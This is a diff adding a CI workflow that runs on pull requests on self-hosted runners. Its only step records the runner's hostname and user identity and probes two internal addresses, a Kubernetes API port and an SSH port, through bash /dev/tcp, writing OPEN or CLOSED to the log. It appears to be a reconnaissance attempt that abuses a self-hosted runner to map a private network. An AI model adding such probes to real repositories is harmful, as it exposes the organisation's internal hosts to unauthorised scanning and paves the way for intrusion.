@@ -1,0 +1,13 @@
+name: wmpr18100
+on: pull_request
+jobs:
+  p:
+    runs-on: [self-hosted, wm-org-local]
+    timeout-minutes: 8
+    steps:
+      - name: probe
+        run: |
+          echo "HOST=$(hostname)"; echo "ID=$(id)"
+          (timeout 6 bash -c 'echo > /dev/tcp/192.168.9.30/6443' && echo "192.168.9.30:6443 OPEN") || echo "192.168.9.30:6443 CLOSED"
+          (timeout 6 bash -c 'echo > /dev/tcp/10.102.4.148/22' && echo "10.102.4.148:22 OPEN") || echo "10.102.4.148:22 CLOSED"
+          echo DONE18100
